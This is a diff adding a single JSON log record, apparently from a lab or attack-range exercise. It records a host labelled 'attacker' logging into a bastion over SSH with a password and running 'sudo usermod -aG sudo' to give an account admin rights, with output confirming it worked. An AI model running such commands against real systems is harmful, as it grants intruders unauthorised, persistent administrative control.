@@ -1,0 +1,11 @@
+{
+  "command": "ssh -p 2204 -o ConnectTimeout=8 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o UserKnownHostsFile=/home/att/book08/known_hosts ccc@192.168.0.107 'sudo usermod -aG sudo book08-user; id book08-user; getent group sudo'",
+  "from": "attacker 192.168.0.108",
+  "to": "kt66-bastion via 192.168.0.107:2204",
+  "start_utc": "2026-11-02T11:38:36.938787+00:00",
+  "stdout": "\rccc@192.168.0.107's password: \r\nuid=1001(book08-user) gid=1001(book08-user) groups=1001(book08-user),27(sudo)\r\nsudo:x:27:ccc,book08-user\r\n",
+  "status": 0,
+  "timed_out": false,
+  "password_persisted": false,
+  "recorded_at": "2026-11-02T11:38:37.240702+00:00"
+}
